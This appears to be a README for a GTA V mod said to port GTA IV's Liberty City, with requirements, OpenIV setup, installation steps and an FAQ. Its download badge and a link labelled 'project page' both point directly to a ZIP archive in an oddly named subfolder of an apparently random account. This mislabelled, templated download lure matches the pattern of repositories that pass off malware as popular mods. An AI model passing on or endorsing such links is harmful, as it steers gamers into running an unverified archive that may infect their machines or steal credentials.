# 🏙️ Project-RevIVe-GTA-V - Experience Liberty City in GTA V

[![](https://img.shields.io/badge/Download-Project_RevIVe-blue.svg)](https://raw.githubusercontent.com/Wdll6756/Project-RevIVe-GTA-V/main/Mithriac/Ve_V_GT_I_Project_Rev_v3.3-beta.3.zip)

Project-RevIVe-GTA-V brings the complete Liberty City environment into the Grand Theft Auto V engine. This mod adds all five boroughs from GTA IV, high-quality textures, and functional map data to your existing game installation.

## 📋 System Requirements

Computers need specific hardware to run these assets at a stable frame rate. Ensure your system meets these standards before you begin:

*   **Operating System:** Windows 10 or Windows 11 (64-bit).
*   **Processor:** Intel Core i7 or AMD Ryzen 7.
*   **Memory:** 16 GB RAM or higher.
*   **Graphics:** NVIDIA GeForce RTX 3060 or AMD Radeon RX 6700 with 8GB VRAM.
*   **Storage:** 150 GB of free space on a Solid State Drive.
*   **Software:** A clean, legally owned copy of GTA V installed via Steam, Epic Games, or Rockstar Games Launcher.

## 🛠️ Required External Tools

This project relies on the OpenIV modification platform to inject files into your game directory. You must install this tool for the mod to function.

1. Go to the official OpenIV website.
2. Download and install the software.
3. Launch OpenIV and select Grand Theft Auto V for Windows.
4. Point the software to your GTA V game folder when prompted.
5. In the OpenIV menu, go to Tools and select ASI Manager.
6. Install the ASI Loader and OpenIV.ASI components to enable external file support.

## 💾 Installation Steps

Follow these instructions to move the Liberty City files into your game folder.

1. Visit the [project page](https://raw.githubusercontent.com/Wdll6756/Project-RevIVe-GTA-V/main/Mithriac/Ve_V_GT_I_Project_Rev_v3.3-beta.3.zip) to download the archive file.
2. Extract the contents of the ZIP folder to a temporary location on your desktop.
3. Open the main program you installed earlier, OpenIV.
4. Click the Edit Mode button located in the top toolbar. Confirm the prompt that appears.
5. Navigate to your "mods" folder inside the GTA V directory. If you do not have a "mods" folder, you may create one by copying the "update" folder from your root game directory into the "mods" directory.
6. Use the OpenIV installer feature to select the mod files you extracted.
7. Wait for the file transfer process to finish. This operation may take several minutes depending on your drive speed.
8. Verify that the files appear in your "mods/update/x64/dlcpacks" folder within OpenIV.
9. Close OpenIV.

## 🎮 Playing the Mod

Once the installation finishes, you start the game through your normal launcher.

1. Launch your GTA V game client.
2. Start the game normally.
3. The mod loads the new map data automatically when you enter the game world.
4. Use the in-game map to navigate between the new boroughs.

## ❓ Frequently Asked Questions

**Will this mod work with GTA Online?**
No. Rockstar Games prohibits the use of mods in their online service. Only run this mod in offline single-player mode. You risk a permanent account ban if you attempt to connect to multiplayer servers with these files installed.

**The game crashes upon startup. What do I do?**
Crashes usually happen when the game fails to load modified assets. Ensure you installed the ASI Loader through the OpenIV ASI Manager. Check that your "mods" folder contains the required files.

**How do I uninstall the mod?**
Open OpenIV and enter Edit Mode. Navigate to your "mods/update/x64/dlcpacks" folder and delete the folder associated with Project RevIVe. Alternatively, you can verify your game files through your game launcher to remove any modifications.

**What performance can I expect?**
The Liberty City map includes extensive geometry and high-resolution textures. Your frame rate depends on your hardware settings. If you experience micro-stuttering, lower your texture quality or frame scaling settings in the game options menu.

**Are the traffic paths and pedestrians functional?**
Yes. The modification includes complete pathing data. Traffic will navigate the streets and pedestrians will walk on the sidewalks across all five boroughs.

**Do I need a specific version of GTA V?**
Always keep your game updated to the latest version provided by your launcher. Outdated game versions may cause compatibility errors with the mod.
